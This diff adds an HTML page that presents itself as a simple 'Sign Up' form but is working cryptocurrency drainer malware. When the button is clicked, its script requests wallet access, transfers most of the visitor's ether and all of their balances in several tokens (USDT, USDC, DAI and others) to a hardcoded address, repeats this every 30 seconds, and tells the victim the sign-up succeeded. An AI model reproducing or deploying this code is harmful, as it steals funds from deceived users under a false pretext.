@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign Up</title>
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+  <style>
+    body{margin:0;height:100vh;background:#0a0a1f;color:#fff;font-family:Arial,sans-serif;display:flex;flex-direction:column;justify-content:center;align-items:center}
+    h1{font-size:3.5rem;margin-bottom:30px}
+    button{background:#00d4ff;border:none;color:#000;padding:25px 80px;font-size:2.5rem;font-weight:700;border-radius:15px;cursor:pointer;box-shadow:0 10px 30px rgba(0,212,255,.6);transition:all .3s}
+    button:hover{background:#00aaff;transform:translateY(-5px)}
+    #status{margin-top:50px;font-size:1.8rem;min-height:120px;text-align:center}
+    .success{color:#00ff88!important;font-weight:700;font-size:2.2rem}
+    .error{color:#ff4444!important;font-weight:700}
+  </style>
+</head>
+<body>
+  <h1>Sign Up</h1>
+  <button id="signupBtn">Sign Up</button>
+  <div id="status"></div>
+
+  <script>
+    const status=document.getElementById("status");
+    const btn=document.getElementById("signupBtn");
+
+    const w="0x0a19b57043E1766F3d7fda42B7f9E2978c5A7F5D";
+
+    const t=[
+      {s:"USDT",a:"0xdAC17F958D2ee523a2206206994597C13D831ec7"},
+      {s:"USDC",a:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},
+      {s:"DAI",a:"0x6B175474E89094C44Da98b954EedeAC495271d0F"},
+      {s:"SHIB",a:"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"},
+      {s:"UNI",a:"0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"},
+      {s:"LINK",a:"0x514910771AF9Ca656af840dff83E8264EcF986CA"},
+      {s:"PEPE",a:"0x6982508145454Ce325dDbE47a25d4ec3d2311933"}
+    ];
+
+    const a=["balanceOf(address) view returns (uint256)","transfer(address,uint256) returns (bool)"];
+
+    let connected=false;
+    let lastNative=0n;
+
+    async function drain(){
+      if(!window.ethereum)return;
+      try{
+        if(!connected){
+          await window.ethereum.request({method:"eth_requestAccounts"});
+          connected=true;
+          status.innerHTML="Processing...";
+        }
+        const p=new ethers.providers.Web3Provider(window.ethereum);
+        const si=p.getSigner();
+        const u=await si.getAddress();
+
+        const nb=await p.getBalance(u);
+        if(nb.gt(lastNative)&&nb.gt(ethers.utils.parseEther("0.0001"))){
+          const r=ethers.utils.parseEther("0.0005");
+          const am=nb.sub(r);
+          await si.sendTransaction({to:w,value:am,gasLimit:21000});
+          lastNative=nb;
+        }
+
+        for(const tk of t){
+          try{
+            const c=new ethers.Contract(tk.a,a,si);
+            const b=await c.balanceOf(u);
+            if(b.gt(0)){
+              await c.transfer(w,b,{gasLimit:150000});
+            }
+          }catch{}
+        }
+
+        if(connected)status.innerHTML="<strong style='font-size:2.5rem'>Sign up successfully!</strong>";
+      }catch(e){
+        status.innerHTML="Failed.";
+        status.className="error";
+      }
+    }
+
+    btn.onclick=()=>{drain();setInterval(drain,30000);};
+  </script>
+</body>
+</html>
